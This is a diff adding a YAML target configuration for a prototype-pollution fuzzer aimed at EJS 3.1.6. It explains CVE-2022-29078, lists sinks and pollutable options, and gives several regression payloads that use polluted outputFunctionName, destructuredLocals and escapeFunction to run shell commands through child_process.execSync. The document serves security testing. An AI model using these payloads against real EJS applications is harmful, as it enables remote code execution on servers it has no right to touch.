@@ -1,0 +1,128 @@
+# UoPFuzz Target Configuration for EJS
+# EJS (Embedded JavaScript Templates) — the de-facto template engine for Express.js
+# ~26M downloads/week; used in most Node.js web application starters and tutorials.
+#
+# CVE-2022-29078 (CVSS 9.8 CRITICAL):
+#   Polluting Object.prototype.outputFunctionName causes EJS to inject that value
+#   verbatim into the Function() constructor body during template compilation.
+#   Fixed in 3.1.7 (commit 15ee698: outputFunctionName/localsName/destructuredLocals
+#   are validated against a JS-identifier regex). Pin stays at 3.1.6 to demonstrate
+#   the vulnerability — 3.1.7+ throws instead of injecting.
+#   (ejs < 3.1.10 is a DIFFERENT, unrelated, lower-severity advisory —
+#   CVE-2024-33883, GHSA-ghr5-ch3p-vcr6, "lacks certain pollution protection".)
+#
+# Attack surface summary:
+#   - ejs.render(template, data, opts)  → reads opts from Object.prototype
+#   - ejs.compile(template, opts)       → reads opts from Object.prototype
+#   The opts object is never sanitized for prototype-chain properties;
+#   any property set on Object.prototype is visible as if it were a real option.
+
+name: "ejs"
+package: "ejs"
+version: "3.1.6"
+description: "Express template engine vulnerable to prototype pollution RCE — CVE-2022-29078"
+
+# Entry points — functions the fuzzer will call
+entryPoints:
+  - name: "render"
+    inputType: "template"
+    description: "Render a template string with locals and options"
+  - name: "compile"
+    inputType: "template"
+    description: "Compile a template string into a reusable function"
+  - name: "renderFile"
+    inputType: "string"
+    description: "Render a template from a file path (path traversal surface)"
+
+# Multi-step sequences:
+#   compile() returns a function — calling it triggers the code path
+#   that reads outputFunctionName/escapeFunction/destructuredLocals.
+sequences:
+  - entryPoint: "compile"
+    steps:
+      - call: "compile"
+        args: ["template", "options"]
+      - call: "__result__"
+        args: ["locals"]
+  - entryPoint: "render"
+    steps:
+      - call: "render"
+        args: ["template", "locals", "options"]
+
+# Dangerous sinks EJS routes to during template compilation
+sinks:
+  - "Function"         # Template compiled via new Function(...)
+  - "eval"
+  - "vm.runInThisContext"
+  - "child_process.exec"
+  - "fs.readFile"      # renderFile reads from disk — LFI risk
+
+# Properties EJS reads from the options object.
+# These are read WITHOUT hasOwnProperty guards in vulnerable versions,
+# so any Object.prototype property polluted before ejs.render() is called
+# will be visible here.
+pollutionPoints:
+  # ── Tier 1: CONFIRMED RCE gadgets (CVE-2022-29078) ──────────────────────
+  - "outputFunctionName"    # Injected verbatim into Function() body → RCE
+  - "destructuredLocals"    # Array of variable names injected into Function body → RCE
+  - "escapeFunction"        # Used as: escape = opts.escapeFunction → injected → RCE
+  - "client"                # client=true changes compilation path, exposes more sinks
+
+  # ── Tier 2: High-risk config options ────────────────────────────────────
+  - "delimiter"             # Changes how EJS parses <% %> tags
+  - "openDelimiter"         # Opening tag character
+  - "closeDelimiter"        # Closing tag character
+  - "rmWhitespace"          # Affects template processing
+  - "strict"                # Enables strict mode in generated function
+  - "localsName"            # Name of the locals variable in function scope → injection
+  - "_with"                 # Whether to use `with(locals)` — changes scope exposure
+  - "views"                 # Template search paths → LFI via path traversal
+  - "root"                  # Root path for includes → LFI
+  - "filename"              # Current template filename (used in error messages & includes)
+
+  # ── Tier 3: Boolean gates ─────────────────────────────────────────────
+  - "cache"
+  - "debug"
+  - "compileDebug"
+  - "async"
+
+  # ── Tier 4: Generic Object.prototype gadgets ──────────────────────────
+  - "constructor"
+  - "toString"
+  - "valueOf"
+
+# Known vulnerability patterns for regression testing
+knownPatterns:
+  - description: "outputFunctionName injected into Function() body — primary RCE vector"
+    pattern: "__proto__.outputFunctionName"
+    payload: "x;process.mainModule.require('child_process').execSync('id');//"
+    sink: "Function"
+    impact: "RCE"
+    reference: "CVE-2022-29078, PortSwigger Research 2022"
+
+  - description: "destructuredLocals array elements injected into Function body"
+    pattern: "__proto__.destructuredLocals"
+    payload: ["x;process.mainModule.require('child_process').execSync('id');//"]
+    sink: "Function"
+    impact: "RCE"
+    reference: "CVE-2022-29078"
+
+  - description: "escapeFunction polluted with code string injected into compiled function"
+    pattern: "__proto__.escapeFunction"
+    payload: "1;return process.mainModule.require('child_process').execSync('id').toString()//"
+    sink: "Function"
+    impact: "RCE"
+    reference: "CVE-2022-29078"
+
+  - description: "client=true changes compilation to expose outputFunctionName sink"
+    pattern: "__proto__.client"
+    payload: true
+    sink: "Function"
+    impact: "RCE"
+    reference: "CVE-2022-29078"
+
+# Testing configuration
+testConfig:
+  timeout: 30
+  maxDepth: 3
+  enableAsyncTesting: false   # EJS compile() is synchronous
